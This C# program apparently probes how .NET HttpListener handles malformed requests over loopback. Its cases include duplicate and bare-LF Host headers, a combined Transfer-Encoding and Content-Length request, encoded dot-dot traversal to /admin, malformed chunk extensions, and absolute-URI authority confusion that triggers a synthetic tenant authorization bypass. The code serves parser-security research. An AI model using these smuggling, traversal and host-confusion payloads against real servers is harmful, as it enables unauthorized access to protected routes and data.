using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

record Case(string Name, Func<int,string> Request);

class Program
{
    static async Task<int> FreePort()
    {
        var t = new TcpListener(IPAddress.Loopback, 0);
        t.Start();
        int p = ((IPEndPoint)t.LocalEndpoint).Port;
        t.Stop();
        return p;
    }

    static async Task RunCase(Case c)
    {
        int port = await FreePort();
        using var listener = new HttpListener();
        listener.Prefixes.Add($"http://127.0.0.1:{port}/");
        listener.Start();

        Task<HttpListenerContext> contextTask = listener.GetContextAsync();

        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, port);
        using NetworkStream ns = client.GetStream();
        string raw = c.Request(port);
        byte[] bytes = Encoding.ASCII.GetBytes(raw);
        await ns.WriteAsync(bytes);
        await ns.FlushAsync();

        var responseTask = ReadSome(ns);
        Task first = await Task.WhenAny(contextTask, responseTask, Task.Delay(3000));

        if (first == contextTask && contextTask.IsCompletedSuccessfully)
        {
            var ctx = await contextTask;
            string[]? hosts = ctx.Request.Headers.GetValues("Host");
            Console.WriteLine($"CASE={c.Name} RESULT=CONTEXT HOST={ctx.Request.UserHostName} URLHOST={ctx.Request.Url?.Host} HOSTVALUES={string.Join("|", hosts ?? Array.Empty<string>())} METHOD={ctx.Request.HttpMethod} RAWURL={ctx.Request.RawUrl} ABSPATH={ctx.Request.Url?.AbsolutePath} LOCALPATH={ctx.Request.Url?.LocalPath}");
            ctx.Response.StatusCode = 204;
            ctx.Response.Close();
        }
        else if (first == responseTask)
        {
            string response = await responseTask;
            string firstLine = response.Split(new[]{"\r\n","\n"}, StringSplitOptions.None)[0];
            Console.WriteLine($"CASE={c.Name} RESULT=RESPONSE FIRSTLINE={firstLine}");
        }
        else
        {
            Console.WriteLine($"CASE={c.Name} RESULT=TIMEOUT");
        }

        listener.Stop();
    }

    static async Task<string> ReadSome(NetworkStream ns)
    {
        var buffer = new byte[4096];
        try
        {
            int n = await ns.ReadAsync(buffer).AsTask().WaitAsync(TimeSpan.FromSeconds(3));
            return Encoding.ASCII.GetString(buffer,0,n);
        }
        catch { return ""; }
    }

    static async Task RunBackend()
    {
        const int port = 18081;
        using var listener = new HttpListener();
        listener.Prefixes.Add($"http://*:{port}/");
        listener.Start();
        Console.WriteLine($"BACKEND_READY port={port}");
        Console.Out.Flush();

        while (true)
        {
            HttpListenerContext ctx = await listener.GetContextAsync();
            string[]? hosts = ctx.Request.Headers.GetValues("Host");
            string parsedBody = "";
            string bodyStatus = "NOT_READ";
            if (ctx.Request.HasEntityBody)
            {
                try
                {
                    using var bodyMs = new MemoryStream();
                    await ctx.Request.InputStream.CopyToAsync(bodyMs).WaitAsync(TimeSpan.FromSeconds(5));
                    parsedBody = Encoding.ASCII.GetString(bodyMs.ToArray());
                    bodyStatus = "OK";
                }
                catch (Exception ex)
                {
                    bodyStatus = "ERROR:" + ex.GetType().Name;
                }
            }

            string line = $"BACKEND_CONTEXT HOST={ctx.Request.UserHostName} URLHOST={ctx.Request.Url?.Host} HOSTVALUES={string.Join("|", hosts ?? Array.Empty<string>())} METHOD={ctx.Request.HttpMethod} RAWURL={ctx.Request.RawUrl} ABSPATH={ctx.Request.Url?.AbsolutePath} LOCALPATH={ctx.Request.Url?.LocalPath} BODYSTATUS={bodyStatus} BODY={parsedBody}";
            Console.WriteLine(line);
            Console.Out.Flush();

            string payload = string.Equals(ctx.Request.Url?.AbsolutePath, "/admin", StringComparison.Ordinal)
                ? "ADMIN_SECRET_SENTINEL_9f6e\n" + line + "\n"
                : line + "\n";
            byte[] body = Encoding.UTF8.GetBytes(payload);
            ctx.Response.StatusCode = 200;
            ctx.Response.ContentType = "text/plain";
            ctx.Response.ContentLength64 = body.Length;
            await ctx.Response.OutputStream.WriteAsync(body);
            ctx.Response.Close();
        }
    }


    static async Task RunChunkCase(string name, string chunkSizeLine)
    {
        int port = await FreePort();
        using var listener = new HttpListener();
        listener.Prefixes.Add($"http://127.0.0.1:{port}/");
        listener.Start();

        Task<HttpListenerContext> contextTask = listener.GetContextAsync();

        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, port);
        using NetworkStream ns = client.GetStream();

        string raw =
            $"POST /chunk HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{port}\r\n" +
            "Transfer-Encoding: chunked\r\n" +
            "Connection: close\r\n" +
            "\r\n" +
            chunkSizeLine + "\r\n" +
            "Hello\r\n" +
            "0\r\n" +
            "\r\n";

        await ns.WriteAsync(Encoding.Latin1.GetBytes(raw));
        await ns.FlushAsync();

        Task<string> responseTask = ReadSome(ns);
        Task first = await Task.WhenAny(contextTask, responseTask, Task.Delay(3000));

        if (first == contextTask && contextTask.IsCompletedSuccessfully)
        {
            HttpListenerContext ctx = await contextTask;
            try
            {
                using var ms = new MemoryStream();
                await ctx.Request.InputStream.CopyToAsync(ms).WaitAsync(TimeSpan.FromSeconds(3));
                string body = Encoding.ASCII.GetString(ms.ToArray());
                Console.WriteLine($"CHUNK_CASE={name} RESULT=BODY BODY={body}");
                ctx.Response.StatusCode = 204;
                ctx.Response.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"CHUNK_CASE={name} RESULT=READ_ERROR TYPE={ex.GetType().Name} MSG={ex.Message.Replace("\r"," ").Replace("\n"," ")}");
                try { ctx.Response.Abort(); } catch { }
            }
        }
        else if (first == responseTask)
        {
            string response = await responseTask;
            string firstLine = response.Split(new[]{"\r\n","\n"}, StringSplitOptions.None)[0];
            Console.WriteLine($"CHUNK_CASE={name} RESULT=RESPONSE FIRSTLINE={firstLine}");
        }
        else
        {
            Console.WriteLine($"CHUNK_CASE={name} RESULT=TIMEOUT");
        }

        listener.Stop();
    }


    static async Task RunAuthorityCase(string name, Func<int, string> makeRequest)
    {
        int port = await FreePort();
        using var listener = new HttpListener();
        listener.Prefixes.Add($"http://*:{port}/");
        listener.Start();

        Task<HttpListenerContext> contextTask = listener.GetContextAsync();
        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, port);
        using NetworkStream ns = client.GetStream();

        string raw = makeRequest(port);
        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
        await ns.FlushAsync();

        Task<string> responseTask = ReadSome(ns);
        Task first = await Task.WhenAny(contextTask, responseTask, Task.Delay(3000));

        if (first == contextTask && contextTask.IsCompletedSuccessfully)
        {
            HttpListenerContext ctx = await contextTask;
            string hostHeader = ctx.Request.Headers["Host"] ?? "<null>";
            string userHost = ctx.Request.UserHostName ?? "<null>";
            string urlHost = ctx.Request.Url?.Host ?? "<null>";

            // Researcher-controlled two-tenant security boundary:
            // 1) front-door authorization trusts UserHostName/Host and only permits public.test;
            // 2) application tenant routing uses Request.Url.Host;
            // 3) admin.test contains a synthetic secret unavailable to the public tenant.
            bool authorizedAsPublic = string.Equals(userHost.Split(':')[0], "public.test", StringComparison.OrdinalIgnoreCase);
            bool routedToAdmin = string.Equals(urlHost, "admin.test", StringComparison.OrdinalIgnoreCase);
            bool authorizationBypass = authorizedAsPublic && routedToAdmin;

            string result = $"AUTH_CASE={name} RESULT=CONTEXT HOSTHDR={hostHeader} USERHOST={userHost} URLHOST={urlHost} RAWURL={ctx.Request.RawUrl} AUTHZ={(authorizedAsPublic ? "ALLOW_PUBLIC" : "DENY")} ROUTE={(routedToAdmin ? "ADMIN" : "PUBLIC")} BYPASS={authorizationBypass}";
            Console.WriteLine(result);

            string payload = authorizationBypass
                ? "TENANT_AUTH_BYPASS_SENTINEL_71c4\nADMIN_SECRET=research-only-secret\n" + result + "\n"
                : result + "\n";
            byte[] body = Encoding.ASCII.GetBytes(payload);
            ctx.Response.StatusCode = authorizedAsPublic ? 200 : 403;
            ctx.Response.ContentLength64 = body.Length;
            await ctx.Response.OutputStream.WriteAsync(body);
            ctx.Response.Close();

            string clientResponse = await responseTask;
            bool sentinelReturned = clientResponse.Contains("TENANT_AUTH_BYPASS_SENTINEL_71c4", StringComparison.Ordinal);
            string clientFirstLine = clientResponse.Split(new[]{"\r\n","\n"}, StringSplitOptions.None)[0];
            Console.WriteLine($"AUTH_CLIENT={name} FIRSTLINE={clientFirstLine} SENTINEL_RETURNED={sentinelReturned}");
        }
        else if (first == responseTask)
        {
            string response = await responseTask;
            string firstLine = response.Split(new[]{"\r\n","\n"}, StringSplitOptions.None)[0];
            Console.WriteLine($"AUTH_CASE={name} RESULT=RESPONSE FIRSTLINE={firstLine}");
        }
        else
        {
            Console.WriteLine($"AUTH_CASE={name} RESULT=TIMEOUT");
        }

        listener.Stop();
    }

    static async Task Main(string[] args)
    {
        if (args.Length > 0 && args[0] == "--server")
        {
            await RunBackend();
            return;
        }

        Console.WriteLine($"OS={Environment.OSVersion}");
        Console.WriteLine($"FRAMEWORK={System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");

        Case[] cases = {
            new("CONTROL_CRLF", p =>
                $"GET /control HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\nConnection: close\r\n\r\n"),

            new("DUP_HOST_FIRST_ATTACKER_LAST_VALID", p =>
                $"GET /dup HTTP/1.1\r\nHost: attacker.invalid\r\nHost: 127.0.0.1:{p}\r\nConnection: close\r\n\r\n"),

            new("DUP_HOST_FIRST_VALID_LAST_ATTACKER", p =>
                $"GET /dup HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\nHost: attacker.invalid\r\nConnection: close\r\n\r\n"),

            new("BARE_LF_ALL_LINES", p =>
                $"GET /lf HTTP/1.1\nHost: 127.0.0.1:{p}\nConnection: close\n\n"),

            new("BARE_LF_HIDDEN_HOST", p =>
                $"GET /lfhost HTTP/1.1\r\nHost: attacker.invalid\nHost: 127.0.0.1:{p}\r\nConnection: close\r\n\r\n"),

            new("TE_CL_BOTH", p =>
                $"POST /tecl HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n"),

            new("DIRECT_ADMIN", p =>
                $"GET /admin HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\nConnection: close\r\n\r\n"),

            new("ENCODED_DOTDOT_TO_ADMIN", p =>
                $"GET /public/%2e%2e/admin HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\nConnection: close\r\n\r\n"),

            new("ENCODED_MIXED_DOTDOT_TO_ADMIN", p =>
                $"GET /public/.%2e/admin HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\nConnection: close\r\n\r\n")
        };

        foreach (var c in cases)
        {
            try { await RunCase(c); }
            catch(Exception ex) { Console.WriteLine($"CASE={c.Name} RESULT=EXCEPTION TYPE={ex.GetType().Name} MSG={ex.Message.Replace("\r"," ").Replace("\n"," ")}"); }
        }

        var chunkCases = new (string Name, string Line)[]
        {
            ("VALID_EXTENSION", "5;foo=bar"),
            ("EMPTY_EXTENSION", "5;"),
            ("DOUBLE_SEMICOLON", "5;;foo=bar"),
            ("MISSING_EXTENSION_NAME", "5;=bar"),
            ("UNTERMINATED_QUOTED_VALUE", "5;foo=\"unterminated"),
            ("SPACE_IN_UNQUOTED_VALUE", "5;foo=bar baz"),
            ("TAB_AFTER_SEMICOLON", "5;\tfoo=bar"),
            ("CONTROL_IN_EXTENSION", "5;foo=\u0001bar"),
        };

        foreach (var chunkCase in chunkCases)
        {
            try { await RunChunkCase(chunkCase.Name, chunkCase.Line); }
            catch(Exception ex) { Console.WriteLine($"CHUNK_CASE={chunkCase.Name} RESULT=EXCEPTION TYPE={ex.GetType().Name} MSG={ex.Message.Replace("\r"," ").Replace("\n"," ")}"); }
        }

        var authorityCases = new (string Name, Func<int,string> MakeRequest)[]
        {
            ("ORIGIN_PUBLIC", p =>
                $"GET /authority HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),

            ("ABS_ADMIN_HOST_PUBLIC", p =>
                $"GET http://admin.test:{p}/authority HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),

            ("ABS_PUBLIC_HOST_ADMIN", p =>
                $"GET http://public.test:{p}/authority HTTP/1.1\r\nHost: admin.test\r\nConnection: close\r\n\r\n"),

            ("ABS_USERINFO_PUBLIC_AT_ADMIN", p =>
                $"GET http://public.test@admin.test:{p}/authority HTTP/1.1\r\nHost: public.test\r\nConnection: close\r\n\r\n"),
        };

        foreach (var authorityCase in authorityCases)
        {
            try { await RunAuthorityCase(authorityCase.Name, authorityCase.MakeRequest); }
            catch(Exception ex) { Console.WriteLine($"AUTH_CASE={authorityCase.Name} RESULT=EXCEPTION TYPE={ex.GetType().Name} MSG={ex.Message.Replace("\r"," ").Replace("\n"," ")}"); }
        }
    }
}
